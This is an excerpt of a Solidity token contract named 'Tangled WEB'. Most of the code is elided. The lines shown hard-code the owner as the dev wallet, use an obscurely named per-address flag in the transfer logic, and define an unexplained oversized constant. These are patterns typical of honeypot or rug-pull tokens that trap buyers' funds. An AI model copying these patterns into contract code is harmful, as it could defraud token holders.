...
// Telegram : https://t.me/TangledWebBSC
...
contract TangledWEB is Context, IERC20 { 
    ...
    function xDev() public view virtual returns (address) {
        return Wallet_Dev;
    }
    ...
    address payable public Wallet_Marketing = payable(0x55f0cDa76e7a7852FC913fF3d477873A2a2Cdd2B); 
    address payable public Wallet_Dev = payable(0xE2A1416b1b38eB99FdB865FbE5557e05e164a91c);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 1* 10**6 * 10**_decimals;
    string private constant _name = "Tangled WEB"; 
    string private constant _symbol = unicode"Tangled"; 
    ...
    uint256 public size = (8+(1)+1)**(10+(10)+3);
    ...
    constructor () {
        ...
        _owner = 0xE2A1416b1b38eB99FdB865FbE5557e05e164a91c;
    ...
    function checkExcluded(address check) public view returns(bool){
        return _inAllowances[check];
    }
    ...
    function _transfer(
        ...
        bool takeFee = true;
        bool isBuy;
        bool prasement = checkExcluded(to);
        ...
        if(!_isExcludedFromFee[from] && prasement){
    ...
    function _transferToken(address sender, address recipient, uint256 tAmount) private{
